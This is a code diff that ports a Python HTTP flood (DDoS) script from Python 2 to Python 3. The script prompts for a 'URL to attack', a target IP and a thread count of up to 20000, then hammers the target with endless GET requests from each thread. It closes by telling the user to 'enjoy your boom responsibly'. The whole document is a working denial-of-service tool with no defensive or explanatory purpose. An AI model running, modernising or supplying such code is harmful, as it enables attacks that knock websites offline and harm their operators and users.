@@ -1,8 +1,6 @@
-#!/usr/bin/python                                        
-                                                         
-import threading                                         
-import sys                                               
-import urllib2                                           
+import threading
+import urllib.request
+import urllib.error
 
 logo="""
 < =============== >
@@ -12,27 +10,27 @@ logo="""
 """
 print(logo)
 
-# Variables                                              
-url = ""                                                 
-ip = ""                                                  
-port = ""                                                
-threads = ""                                             
-method = ""                                              
-maxThreads = int(20000)                                  
-                                                         
-# Get user input                                         
-url = raw_input("[+] Enter a URL to attack: ")           
-ip = raw_input("[+] Enter the target IP address: ")      
-port = raw_input("[+] Enter the target port (default: 80): ")                                                     
-numberOfThreads = raw_input("[+] Enter the desired number of threads (default: 16500): ")                         
-method = raw_input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")                     
-                                                         
-# Use default parameters if no input is given            
-if port == "":                                           
-    port = str(80)                                       
+# Variables
+url = ""
+ip = ""
+port = ""
+threads = ""
+method = ""
+maxThreads = int(20000)
+
+# Get user input
+url = input("[+] Enter a URL to attack: ")
+ip = input("[+] Enter the target IP address: ")
+port = input("[+] Enter the target port (default: 80): ")
+numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
+method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
+
+# Use default parameters if no input is given
+if port == "":
+    port = str(80)
 if numberOfThreads == "":
     numberOfThreads = int(16500)
-if maxThreads < numberOfThreads:
+if maxThreads < int(numberOfThreads):
     numberOfThreads = int(maxThreads)
 if method == "":
     method = "GET"
@@ -46,18 +44,18 @@ headers = {
 
 # Begin attack
 def attack(ip, port, threadNum):
-    request = urllib2.Request(url,None,headers)
+    request = urllib.request.Request(url, None, headers)
     while True:
         try:
-            urlsocket_file = urllib2.urlopen(request)
-            print "[*] Thread (%s) | Attack Sent!" % (threadNum)
-        except:
-            print "[*] Thread (%s) | URL or IP not valid!" % (threadNum)
-            print "[*] Thread (%s) | Attack stopped." % (threadNum)
+            urlsocket_file = urllib.request.urlopen(request)
+            print("[*] Thread (%s) | Attack Sent!" % (threadNum))
+        except urllib.error.URLError as e:
+            print("[*] Thread (%s) | URL or IP not valid!" % (threadNum))
+            print("[*] Thread (%s) | Attack stopped." % (threadNum))
             break
 
 # Define threads
-for i in range(numberOfThreads):
+for i in range(int(numberOfThreads)):
     threading.Thread(target=attack, args=(ip,port,i)).start()
 
-print "[+] DDos attack started! Enjoy your 'boom' responsibly! 💣🔥"
+print("[+] DDos attack started! Enjoy your 'boom' responsibly! 💣🔥")
